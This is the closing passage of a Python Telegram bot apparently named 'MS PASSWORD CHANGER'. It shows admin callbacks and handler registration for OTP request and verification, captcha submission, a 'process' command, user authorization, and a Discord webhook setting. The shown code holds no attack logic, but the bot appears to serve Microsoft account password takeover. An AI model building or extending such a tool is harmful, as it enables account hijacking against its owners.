        await query.message.reply_text("✅ Process cancelled\\.", parse_mode=ParseMode.MARKDOWN_V2)

    elif data == "back_main":
        await query.message.reply_text(
            "🔙 Back to menu\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=kb_main_menu(),
        )

    # ── Admin panel callbacks ──────────────────────────────────────────────
    elif data == "adm_authorize":
        if user_id != ADMIN_ID:
            return
        await query.message.reply_text(
            "Send: `/authorize <telegram_user_id>`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )

    elif data == "adm_revoke":
        if user_id != ADMIN_ID:
            return
        await query.message.reply_text(
            "Send: `/revoke <telegram_user_id>`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )

    elif data == "adm_listusers":
        if user_id != ADMIN_ID:
            return
        ctx.args = []
        await cmd_list_users(update, ctx)

    elif data == "adm_stats":
        if user_id != ADMIN_ID:
            return
        ctx.args = []
        await cmd_stats(update, ctx)

    elif data == "adm_webhook":
        if user_id != ADMIN_ID:
            return
        await query.message.reply_text(
            "Send: `/set_webhook <discord_webhook_url>`",
            parse_mode=ParseMode.MARKDOWN_V2,
        )

    elif data == "adm_close":
        await query.message.delete()


# ══════════════════════════════════════════════════════════════════════════════
#  ERROR HANDLER
# ══════════════════════════════════════════════════════════════════════════════

async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    logger.error("Unhandled exception", exc_info=ctx.error)


# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

def main() -> None:
    global BOT_TOKEN, ADMIN_ID

    # CLI overrides
    if len(sys.argv) >= 2:
        BOT_TOKEN = sys.argv[1]
    if len(sys.argv) >= 3:
        ADMIN_ID = int(sys.argv[2])

    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not set. Export BOT_TOKEN env var or pass as first argument.")
        sys.exit(1)
    if not ADMIN_ID:
        print("❌ ADMIN_ID not set. Export ADMIN_TELEGRAM_ID env var or pass as second argument.")
        sys.exit(1)

    # Seed admin in authorized users
    if str(ADMIN_ID) not in dm.authorized_users:
        dm.authorize_user(ADMIN_ID, ADMIN_ID)

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .build()
    )

    # ── Register handlers ──────────────────────────────────────────────────
    app.add_handler(CommandHandler("start",          cmd_start))
    app.add_handler(CommandHandler("help",           cmd_help))
    app.add_handler(CommandHandler("request_otp",    cmd_request_otp))
    app.add_handler(CommandHandler("verify_otp",     cmd_verify_otp))
    app.add_handler(CommandHandler("logout",         cmd_logout))
    app.add_handler(CommandHandler("process",        cmd_process))
    app.add_handler(CommandHandler("submit_captcha", cmd_submit_captcha))
    app.add_handler(CommandHandler("status",         cmd_status))
    app.add_handler(CommandHandler("cancel",         cmd_cancel))
    app.add_handler(CommandHandler("admin",          cmd_admin))
    app.add_handler(CommandHandler("authorize",      cmd_authorize))
    app.add_handler(CommandHandler("revoke",         cmd_revoke))
    app.add_handler(CommandHandler("list_users",     cmd_list_users))
    app.add_handler(CommandHandler("set_webhook",    cmd_set_webhook))
    app.add_handler(CommandHandler("stats",          cmd_stats))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_error_handler(error_handler)

    print(f"\n{'═'*60}")
    print(f"  MS PASSWORD CHANGER — TELEGRAM BOT")
    print(f"{'═'*60}")
    print(f"  Admin ID : {ADMIN_ID}")
    print(f"  Webhook  : {'Set' if dm.config.get('webhook_url') else 'Not configured'}")
    print(f"{'═'*60}\n")

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
